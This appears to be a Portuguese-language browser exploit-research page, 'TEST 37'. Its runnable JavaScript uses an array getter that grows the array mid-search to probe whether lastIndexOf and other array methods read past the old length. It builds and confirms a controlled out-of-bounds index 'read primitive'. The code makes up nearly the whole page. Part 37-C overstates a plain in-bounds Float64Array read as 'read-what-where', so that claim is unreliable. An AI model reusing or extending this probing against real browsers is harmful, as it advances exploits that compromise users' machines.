<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 37 - lastIndexOf OOB: Traversal Controlada</title></head>
<body>
<h2>TEST 37 — lastIndexOf Percorreu Além do length Antigo: Traversal OOB Controlada</h2>

<p><b>Achado (TEST 33-D):</b></p>
<ul>
  <li><code>indexOf(9999)</code> → <code>-1</code> — parou no <b>length antigo (10)</b></li>
  <li><code>lastIndexOf(9999)</code> → <code>20</code> — percorreu além do length antigo e <b>encontrou o valor na posição 20</b></li>
</ul>
<p><b>Conclusão:</b> <code>lastIndexOf</code> usa o length <i>pós-expansão</i> (lê de trás pra frente e
acessa o butterfly novo), enquanto <code>indexOf</code> usa o length <i>pré-expansão</i>.
O valor de retorno (índice real no array expandido) pode ser usado como primitivo de leitura.</p>

<p><b>O que exploramos aqui:</b></p>
<ul>
  <li><b>37-A</b> Mapear exatamente até onde <code>lastIndexOf</code> percorre (profundidade do getter)</li>
  <li><b>37-B</b> Colocar dados controlados em posições específicas além do length antigo</li>
  <li><b>37-C</b> Usar o índice retornado por <code>lastIndexOf</code> para indexar outro array (read-what-where)</li>
  <li><b>37-D</b> Comparar indexOf vs lastIndexOf para todos os casos de stale: slice/map/filter vs lastIndexOf</li>
</ul>

<pre id="log">Pronto.</pre>
<button onclick="runA()">37-A: MAPEAR PROFUNDIDADE</button>
<button onclick="runB()">37-B: DADOS CONTROLADOS</button>
<button onclick="runC()">37-C: ÍNDICE COMO PRIMITIVO</button>
<button onclick="runD()">37-D: indexOf VS lastIndexOf</button>

<script>
var log = document.getElementById('log');
function info(m)  { log.textContent += '\n[INFO] ' + m; }
function alerta(m){ log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)    { log.textContent += '\n[OK]   ' + m; }
function sep()    { log.textContent += '\n' + '-'.repeat(60); }
function hex(v)   { return '0x' + (v >>> 0).toString(16).padStart(8,'0'); }

function forceGC() {
  var t=[]; for(var i=0;i<60000;i++) t.push({x:i}); t=null;
}

// Construtor de array com getter expansor no índice TRAP_IDX
// O getter insere TARGET_VALUE em INJECT_IDX (além do length antigo)
function buildTrapArray(origSize, trapIdx, expandSize, injectIdx, injectValue) {
  var arr = [];
  for(var i = 0; i < origSize; i++) arr.push(i * 1.0);

  var triggered = false;
  Object.defineProperty(arr, trapIdx, {
    get: function() {
      if(!triggered) {
        triggered = true;
        for(var k = origSize; k < expandSize; k++) arr[k] = 0.0;
        arr[injectIdx] = injectValue; // valor alvo em posição controlada
        forceGC();
      }
      return trapIdx * 1.0;
    },
    configurable: true, enumerable: true
  });
  return arr;
}

// ─── 37-A ────────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 37-A] Mapear profundidade real do lastIndexOf após expansão...\n';
  sep();
  info('Objetivo: determinar até qual índice lastIndexOf percorre quando o array');
  info('é expandido via getter durante a busca (da direita para a esquerda).\n');

  var ORIG = 10;
  var EXPAND = 200;
  var NEEDLE = 9999.0;

  // Testar diferentes posições de injeção do needle
  // lastIndexOf busca de trás pra frente: começa em arr.length-1
  var injections = [11, 15, 20, 25, 30, 50, 100, 150, 199];

  injections.forEach(function(injectAt) {
    var arr = buildTrapArray(ORIG, Math.floor(ORIG/2), EXPAND, injectAt, NEEDLE);

    var idxResult  = arr.indexOf(NEEDLE);
    var lastResult = arr.lastIndexOf(NEEDLE);

    info('injectAt=' + injectAt +
         ' | indexOf=' + idxResult +
         ' | lastIndexOf=' + lastResult +
         ' | arr.length após=' + arr.length);

    if(lastResult === injectAt) {
      alerta('lastIndexOf ENCONTROU NEEDLE em idx=' + injectAt + ' (além do ORIG=' + ORIG + ')! Traversal chegou até posição ' + injectAt + '.');
    } else if(lastResult === -1 && injectAt > ORIG) {
      info('lastIndexOf NAO alcancou idx=' + injectAt + ' (retornou -1)');
    } else if(lastResult >= 0 && lastResult !== injectAt) {
      alerta('lastIndexOf retornou idx INESPERADO: ' + lastResult + ' (needle estava em ' + injectAt + ')!');
    }
  });

  sep();
  info('Conclusão: o maior injectAt onde lastIndexOf encontrou o needle');
  info('é o limite máximo de traversal do lastIndexOf no array expandido.');
}

// ─── 37-B ────────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 37-B] Injetar dados CONTROLADOS em posições OOB e verificar retorno...\n';
  sep();
  info('Objetivo: colocar um valor único em cada posição além do length antigo');
  info('e confirmar que lastIndexOf retorna o índice exato — read primitivo controlado.\n');

  var ORIG    = 10;
  var EXPAND  = 100;
  var TRAP    = 5;

  // Testar que lastIndexOf pode retornar qualquer índice que controlamos
  var controlled_indices = [];

  for(var targetIdx = ORIG + 1; targetIdx <= ORIG + 20; targetIdx++) {
    var UNIQUE_VAL = targetIdx * 1000.0 + 0.777; // valor único por posição

    var arr = buildTrapArray(ORIG, TRAP, EXPAND, targetIdx, UNIQUE_VAL);
    var result = arr.lastIndexOf(UNIQUE_VAL);

    info('targetIdx=' + targetIdx + ' | UNIQUE_VAL=' + UNIQUE_VAL + ' | lastIndexOf=' + result);

    if(result === targetIdx) {
      controlled_indices.push(targetIdx);
      if(controlled_indices.length === 1) {
        alerta('ÍNDICE CONTROLADO CONFIRMADO: colocamos valor único em idx=' + targetIdx +
               ' e lastIndexOf retornou ' + result + ' — podemos obter qualquer índice entre ' +
               ORIG + ' e ' + EXPAND + '!');
      }
    } else if(result >= 0) {
      info('  → resultado inesperado: ' + result);
    }
  }

  sep();
  if(controlled_indices.length > 0) {
    alerta('TOTAL: ' + controlled_indices.length + ' índices controlados com sucesso: [' +
           controlled_indices.join(', ') + ']. Primitivo de índice controlado CONFIRMADO!');
  } else {
    ok('Nenhum índice OOB retornado — lastIndexOf restrito ao length antigo neste run.');
  }
}

// ─── 37-C ────────────────────────────────────────────────────────────────────
function runC() {
  log.textContent = '[TEST 37-C] Usar o índice retornado por lastIndexOf para indexar outro array...\n';
  sep();
  info('Objetivo: lastIndexOf retorna um ÍNDICE controlado. Usar esse índice para ler de');
  info('um segundo array com dados conhecidos → primitivo de leitura indireta.\n');

  var ORIG   = 10;
  var EXPAND = 200;
  var TRAP   = 5;

  // Array de dados alvo: indexado por posições conhecidas
  var dataStore = new Float64Array(EXPAND + 50);
  for(var i = 0; i < dataStore.length; i++) {
    dataStore[i] = i * 13.37; // valor único e reconhecível por posição
  }
  info('dataStore: ' + dataStore.length + ' elementos | dataStore[20]=' + dataStore[20].toFixed(4));

  // Queremos fazer lastIndexOf retornar 20 (índice controlado)
  var TARGET_IDX = 20;
  var NEEDLE = 88888.0; // valor sentinela para busca

  var arr = buildTrapArray(ORIG, TRAP, EXPAND, TARGET_IDX, NEEDLE);

  info('Chamando arr.lastIndexOf(' + NEEDLE + ')...');
  var foundIdx = arr.lastIndexOf(NEEDLE);
  info('lastIndexOf retornou: ' + foundIdx);

  if(foundIdx === TARGET_IDX) {
    alerta('ÍNDICE OOB RETORNADO: ' + foundIdx + '. Usando como índice em dataStore...');

    var readValue = dataStore[foundIdx];
    info('dataStore[' + foundIdx + '] = ' + readValue.toFixed(4));
    info('Esperado: ' + (TARGET_IDX * 13.37).toFixed(4));

    if(Math.abs(readValue - TARGET_IDX * 13.37) < 0.001) {
      alerta('READ-WHAT-WHERE VIA lastIndexOf: índice OOB ' + foundIdx +
             ' usado para ler dataStore[' + foundIdx + ']=' + readValue.toFixed(4) +
             ' — primitivo de leitura indireta com índice controlado via getter expansion!');
    }
  } else if(foundIdx === -1) {
    ok('lastIndexOf retornou -1 — nao alcancou TARGET_IDX=' + TARGET_IDX + ' neste run.');
    info('Tente aumentar EXPAND ou diminuir TARGET_IDX.');
  } else {
    info('lastIndexOf retornou ' + foundIdx + ' (≠ TARGET_IDX ' + TARGET_IDX + ')');
  }

  sep();
  // Variante: mapear toda a faixa acessível de uma vez
  info('\nMapeando índices alcançáveis em uma única varredura...');
  var reachable = [];
  for(var probe = ORIG + 1; probe <= ORIG + 30; probe++) {
    var pArr = buildTrapArray(ORIG, TRAP, EXPAND, probe, probe * 777.0);
    var pResult = pArr.lastIndexOf(probe * 777.0);
    if(pResult >= 0) {
      reachable.push(pResult);
      info('  probe=' + probe + ' lastIndexOf=' + pResult + (pResult === probe ? ' ✓' : ' ≠ esperado'));
    }
  }
  info('Índices alcançáveis via lastIndexOf OOB: [' + reachable.join(', ') + ']');
  if(reachable.length > 5) {
    alerta('FAIXA OOB AMPLA: ' + reachable.length + ' índices acessíveis via lastIndexOf além do length antigo!');
  }
}

// ─── 37-D ────────────────────────────────────────────────────────────────────
function runD() {
  log.textContent = '[TEST 37-D] Comparação sistemática indexOf vs lastIndexOf vs slice/map/filter...\n';
  sep();
  info('Resumo: quais operações usam length antigo vs novo, e quais têm traversal OOB:\n');

  var ORIG   = 10;
  var EXPAND = 100;
  var TRAP   = 5;
  var NEEDLE = 55555.0;
  var INJECT = 15; // posição OOB para o needle

  var results = {};

  function testOp(name, fn) {
    var arr = buildTrapArray(ORIG, TRAP, EXPAND, INJECT, NEEDLE);
    try {
      var r = fn(arr);
      results[name] = r;
      info(name + ': ' + JSON.stringify(r));

      var reachedOOB = false;
      if(typeof r === 'number' && r >= ORIG) reachedOOB = true;
      if(Array.isArray(r) && r.length > ORIG) reachedOOB = true;

      if(reachedOOB) {
        alerta(name + ' ACESSOU ALÉM DO LENGTH ANTIGO: resultado=' + JSON.stringify(r));
      }
    } catch(e) {
      info(name + ': EXCECAO — ' + e.message);
      results[name] = 'ERROR: ' + e.message;
    }
  }

  testOp('indexOf(NEEDLE)',         function(a) { return a.indexOf(NEEDLE); });
  testOp('lastIndexOf(NEEDLE)',     function(a) { return a.lastIndexOf(NEEDLE); });
  testOp('includes(NEEDLE)',        function(a) { return a.includes ? a.includes(NEEDLE) : 'N/A'; });
  testOp('find(v=>v===NEEDLE)',     function(a) { return a.find ? a.find(function(v){return v===NEEDLE;}) : 'N/A'; });
  testOp('findIndex(v=>v===NEEDLE)',function(a) { return a.findIndex ? a.findIndex(function(v){return v===NEEDLE;}) : 'N/A'; });
  testOp('some(v=>v===NEEDLE)',     function(a) { return a.some(function(v){return v===NEEDLE;}); });
  testOp('every(v=>v!==NEEDLE)',    function(a) { return a.every(function(v){return v!==NEEDLE;}); });
  testOp('slice().length',          function(a) { return a.slice().length; });
  testOp('map(v=>v).length',        function(a) { return a.map(function(v){return v;}).length; });
  testOp('filter(()=>true).length', function(a) { return a.filter(function(){return true;}).length; });
  testOp('Array.from().length',     function(a) { return Array.from(a).length; });
  testOp('reduce count',            function(a) { var n=0; a.reduce(function(){n++;return 0;},0); return n; });
  testOp('forEach count',           function(a) { var n=0; a.forEach(function(){n++;}); return n; });

  sep();
  info('RESUMO DAS OPERAÇÕES QUE ACESSAM ALÉM DO LENGTH ANTIGO:');
  Object.keys(results).forEach(function(name) {
    var r = results[name];
    var isOOB = (typeof r === 'number' && r >= ORIG && r !== -1) ||
                (typeof r === 'number' && r > ORIG) ||
                (typeof r === 'boolean' && r === true && name.includes('NEEDLE')) ||
                (typeof r === 'number' && r > ORIG);
    if(isOOB) {
      alerta('OOB: ' + name + ' = ' + JSON.stringify(r));
    }
  });
}
</script>
</body>
</html>
